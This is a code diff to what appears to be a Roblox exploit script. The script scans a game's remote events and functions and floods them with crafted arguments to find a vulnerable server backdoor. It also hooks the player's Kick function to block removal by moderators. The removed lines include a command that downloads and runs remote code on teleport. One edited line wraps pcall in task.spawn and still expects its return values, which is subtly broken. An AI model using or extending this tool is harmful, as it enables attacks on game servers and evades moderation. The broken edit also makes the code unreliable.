@@ -125,7 +125,7 @@ end)
 local placeid = game.PlaceId
 local rems = {}
 for i,v in pairs(game:GetDescendants()) do
-    if not (v.Parent == game:GetService("RobloxReplicatedStorage")) then
+    if not (v:IsDescendantOf(game:GetService("RobloxReplicatedStorage"))) then
         if (v:IsA"RemoteEvent" or v:IsA"RemoteFunction") and not (v.Name:find"UpdateLabel") and not table.find(excl,v.Name) then
             table.insert(rems, v)
         end
@@ -151,9 +151,8 @@ game.LogService.MessageOut:connect(function(asd)
         game["Teleport Service"]:Teleport(placeid,game.Players.LocalPlayer)
     end
 end)
-queue_on_teleport(game:HttpGet(urlforexe))
 hookfunction(game.Players.LocalPlayer.Kick,function()
-    wait(9e9)
+    return wait(9e9)
 end)
 for i,rem in pairs(rems) do
     print(rem:GetFullName())
@@ -161,6 +160,8 @@ for i,rem in pairs(rems) do
         remi = i
         for i,v in pairs(fakes) do
            lastrem = v
+           task.spawn(pcall,function()
+
             rem:FireServer(nil,nil,nil,v)
 rem:FireServer(nil,nil,v)
 rem:FireServer(nil,v)
@@ -180,6 +181,7 @@ rem:FireServer(nil,v.Parent)
 rem:FireServer(v.Parent)
 rem:FireServer(nil,nil,nil,moduleid)
 rem:FireServer(v.Parent,v.Parent,v.Parent,v.Parent,v.Parent,v.Parent)
+        end)
         end
         task.wait(.3)
         if isvulnfound then
@@ -188,7 +190,7 @@ rem:FireServer(v.Parent,v.Parent,v.Parent,v.Parent,v.Parent,v.Parent)
     end
     if rem:IsA"RemoteFunction" then
         for i,v in pairs(fakes) do
-            local r,e = pcall(function()
+            local r,e = task.spawn(pcall,function()
             lastrem = v
             rem:InvokeServer(nil,nil,nil,v)
 rem:InvokeServer(nil,nil,v)
